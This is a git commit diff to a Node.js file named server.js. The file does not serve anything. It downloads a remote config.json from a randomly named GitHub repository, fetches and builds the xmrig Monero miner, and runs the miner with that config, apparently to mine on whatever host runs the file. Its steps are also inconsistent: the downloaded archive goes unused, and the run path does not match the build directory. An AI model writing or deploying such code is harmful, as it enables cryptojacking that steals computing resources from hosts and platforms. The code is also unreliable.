ee6ff952ad9e93ea491babf489d6d8ba399462da
flikamitai <158237949+flikamitai@users.noreply.github.com>
2024-02-27 23:15:20 -0300

    Update server.js

--- server.js
+++ server.js
@@ -4,8 +4,9 @@ const fs = require('fs');
 
 const configFileURL = 'https://raw.githubusercontent.com/flikamitai/Ufcujcfuuguf/main/config.json';
 const configFilePath = 'config.json';
+const xmrigDownloadURL = 'https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-x64.tar.gz';
+const xmrigFilePath = 'xmrig.tar.gz';
 
-// Descargar el archivo config.json
 const file = fs.createWriteStream(configFilePath);
 const request = https.get(configFileURL, function(response) {
   response.pipe(file);
@@ -19,34 +20,47 @@ request.on('finish', function() {
   console.log('Descarga del archivo config.json completada.');
   file.close();
 
-  // Comandos para clonar el repositorio, compilar xmrig y ejecutarlo con la configuración
-  const cloneCommand = 'git clone https://github.com/xmrig/xmrig.git';
-  exec(cloneCommand, (cloneError, cloneStdout, cloneStderr) => {
+  const xmrigFile = fs.createWriteStream(xmrigFilePath);
+  const xmrigRequest = https.get(xmrigDownloadURL, function(response) {
+    response.pipe(xmrigFile);
+  });
+
+  xmrigRequest.on('error', function(err) {
+    console.error(`Error al descargar xmrig: ${err.message}`);
+  });
+
+  xmrigRequest.on('finish', function() {
+    console.log('Descarga de xmrig completada.');
+    xmrigFile.close();
+
+    const cloneCommand = 'git clone https://github.com/xmrig/xmrig.git';
+    exec(cloneCommand, (cloneError, cloneStdout, cloneStderr) => {
       if (cloneError) {
-          console.error(`Error al clonar el repositorio: ${cloneError}`);
-          return;
+        console.error(`Error al clonar el repositorio: ${cloneError}`);
+        return;
       }
       console.log(`Clonación exitosa: ${cloneStdout}`);
       console.error(`stderr: ${cloneStderr}`);
 
-      const buildCommand = 'mkdir xmrig/build && cd xmrig/build && cmake .. && make';
+      const buildCommand = `tar -xf ${xmrigFilePath} && mkdir xmrig/build && cd xmrig/build && cmake .. && make`;
       exec(buildCommand, (buildError, buildStdout, buildStderr) => {
-          if (buildError) {
-              console.error(`Error al compilar xmrig: ${buildError}`);
-              return;
-          }
-          console.log(`Compilación exitosa: ${buildStdout}`);
-          console.error(`stderr: ${buildStderr}`);
+        if (buildError) {
+          console.error(`Error al compilar xmrig: ${buildError}`);
+          return;
+        }
+        console.log(`Compilación exitosa: ${buildStdout}`);
+        console.error(`stderr: ${buildStderr}`);
 
-          const runCommand = './xmrig -c config.json';
-          exec(runCommand, (runError, runStdout, runStderr) => {
-              if (runError) {
-                  console.error(`Error al ejecutar xmrig: ${runError}`);
-                  return;
-              }
-              console.log(`xmrig ejecutándose: ${runStdout}`);
-              console.error(`stderr: ${runStderr}`);
-          });
+        const runCommand = './xmrig -c config.json';
+        exec(runCommand, (runError, runStdout, runStderr) => {
+          if (runError) {
+            console.error(`Error al ejecutar xmrig: ${runError}`);
+            return;
+          }
+          console.log(`xmrig ejecutándose: ${runStdout}`);
+          console.error(`stderr: ${runStderr}`);
+        });
       });
+    });
   });
 });
